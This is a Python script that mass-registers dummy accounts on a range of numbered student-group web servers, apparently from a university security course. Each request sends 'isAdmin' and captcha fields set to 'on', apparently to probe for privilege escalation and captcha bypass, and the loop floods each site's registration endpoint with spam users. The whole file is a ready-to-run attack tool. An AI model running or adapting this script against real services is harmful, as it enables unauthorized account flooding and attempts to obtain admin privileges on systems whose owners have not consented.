import requests
import time
import random

def spam(grp=None, a=10, b=44, verbose=True, nr=10, interactive=False):
    if interactive:
        prompt = "(1) All groups [DEFAULT]\n(2) Choose group nr\n(3) Choose a and b\n>>> "
        s = input(prompt)

        if s == "2":
            grp = int(input("Grp nr: "))
        elif s == "3":
            a = int(input("a: "))
            b = int(input("b: "))

        try:
            nr = int(input("Amount of dummyusers [DEFAULT=10]: "))
        except:
            nr = 10

    if grp:
        a, b = grp, grp

    for i in range(a, b+1):
        url = "https://grp{0}.ttm4135.item.ntnu.no:90{0}/register".format(i)
        try:
            for x in range(1, nr+1):
                r = requests.post(url=url, data={
                    'username': 'hehehe{}random{}'.format(x, random.randint(0, 10000)),
                    'password': 'U need t0 hash th1s!',
                    'password2': 'U need t0 hash th1s!',
                    'repeat': 'U need t0 hash th1s!',
                    'repeatPassword': 'U need t0 hash th1s!',
                    'email': 'script{}@spam.no'.format(x),
                    'isAdmin': 'on',
                    'recaptcha': 'on',
                    'captcha': 'on',
                    'bio': 'I suck at this',
                    'biography': 'I suck at this',
                })
            if verbose:
                print("Grp{}: {}".format(i, r))
        except:
            print("Error at grp{}".format(i))

        time.sleep(0.1) # To be able to cancel in terminal

spam(interactive=True)
